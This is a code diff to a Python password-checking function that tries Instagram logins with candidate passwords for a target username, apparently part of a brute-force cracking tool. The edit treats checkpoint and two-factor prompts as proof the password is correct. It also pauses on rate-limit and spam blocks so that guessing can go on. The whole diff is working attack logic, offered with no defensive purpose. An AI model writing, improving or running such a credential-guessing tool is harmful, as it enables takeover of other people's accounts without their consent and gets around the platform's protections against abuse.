@@ -218,31 +218,60 @@ def insta_pass(USER, PASSWORD):
   L = instaloader.Instaloader()
   try:
     L.login(USER, PASSWORD)
+    # If login succeeds without exception, password is correct
     return True
   except Exception as e:
     error_msg = str(e).lower()
 
-    # Password found (checkpoint required)
-    if "checkpoint" in error_msg or "two-factor" in error_msg:
+    # Debug: Print actual error (comment out in production)
+    print(f"\n{color.CYAN}[DEBUG] Instagram Error: {str(e)[:200]}{color.END}")
+
+    # Check for specific error patterns
+
+    # Password is CORRECT but needs checkpoint/2FA
+    if "checkpoint_required" in error_msg or "checkpoint challenge" in error_msg:
+      return True
+    if "two-factor" in error_msg or "two_factor" in error_msg:
       return True
 
-    # Wrong password
-    if "incorrect" in error_msg or "password" in error_msg:
+    # Password is WRONG
+    if "the password you entered is incorrect" in error_msg:
+      return False
+    if "incorrect password" in error_msg:
+      return False
+    if "wrong password" in error_msg:
+      return False
+    if "bad password" in error_msg:
       return False
 
-    # Rate limited or blocked
-    if "blocked" in error_msg or "rate limit" in error_msg or "too many" in error_msg:
-      print(f"\n{color.YELLOW}[!] Rate limited! Waiting 60 seconds...{color.END}")
-      time.sleep(60)
-      return False
-
-    # Other errors
-    if "user does not exist" in error_msg:
-      print(f"\n{color.RED}[!] User @{USER} does not exist!{color.END}\n")
+    # User doesn't exist
+    if "user does not exist" in error_msg or "couldn't find" in error_msg:
+      print(f"\n{color.RED}[!] Error: User @{USER} does not exist!{color.END}\n")
       exit()
 
-    # Unknown error - show it
-    print(f"\n{color.YELLOW}[!] Unknown error: {str(e)[:100]}{color.END}")
+    # Rate limiting / Too many attempts
+    if "wait a few minutes" in error_msg or "too many" in error_msg:
+      print(f"\n{color.YELLOW}[!] Rate limited! Waiting 120 seconds...{color.END}")
+      time.sleep(120)
+      return False
+    if "rate limit" in error_msg or "spam" in error_msg:
+      print(f"\n{color.YELLOW}[!] Rate limited! Waiting 120 seconds...{color.END}")
+      time.sleep(120)
+      return False
+
+    # Connection errors
+    if "connection" in error_msg or "network" in error_msg:
+      print(f"\n{color.YELLOW}[!] Connection error, retrying...{color.END}")
+      time.sleep(5)
+      return False
+
+    # JSON/API errors (usually means wrong password)
+    if "json" in error_msg or "api" in error_msg:
+      return False
+
+    # Default: treat unknown errors as wrong password
+    # This prevents false positives
+    print(f"\n{color.YELLOW}[!] Unknown error (treating as wrong password): {str(e)[:100]}{color.END}")
     return False
     
 
